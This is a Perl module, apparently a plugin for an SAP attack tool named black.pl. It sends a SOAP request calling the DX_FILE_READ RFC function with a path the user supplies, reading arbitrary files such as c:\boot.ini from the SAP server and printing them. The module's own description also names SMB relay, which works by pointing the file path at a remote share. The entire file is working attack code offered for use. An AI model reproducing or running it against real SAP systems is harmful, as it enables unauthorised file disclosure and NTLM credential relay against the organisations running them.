 #!/usr/bin/perl
# Module Directory listing (DX_FILE_READ)

# CONFIG
######################
my $desc ="File reading + SMB Relay (DX_FILE_READ) \n\t Usage: black.pl .. .. -m id_module <path>  \n\t A path to a file like this: c:\\boot.ini \n"; 
our $funcName="dx_file_read_Func";

######################
push(@descriptions,$desc);
push(@functions,$funcName);
######################


# Special function
######################

sub dx_file_read_Func()
{
	
	my $path;
	my $XML='<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/"  xmlns:xsd="http://www.w3.org/1999/XMLSchema"  xmlns:xsi="http://www.w3.org/1999/XMLSchema-instance"  xmlns:m0="http://tempuri.org/"  xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/">
     <SOAP-ENV:Header/>
     <SOAP-ENV:Body>
        <DX_FILE_READ xmlns="urn:sap-com:document:sap:rfc:functions">
           <DATA_TAB>
             <item>
               <DATA></DATA>
             </item>
           </DATA_TAB>
           <FILENAME>%PATH%</FILENAME>
           <PC></PC>
           <SERVER></SERVER>
        </DX_FILE_READ>
     </SOAP-ENV:Body>
</SOAP-ENV:Envelope>
	';
	
	
	if ($ARGV[$m_arg_i+1]){
		$path=$ARGV[$m_arg_i+1];
		print $path." - path \n\n";
	} else {
		print "Error. Please, enter path name\n";
		exit;
	}

	$XML=~s/%PATH%/$path/s;

	my @answers=send_soap($XML,1);

	my $answer=join('', @answers);

	print $answer;
	
	print "\n\n";
}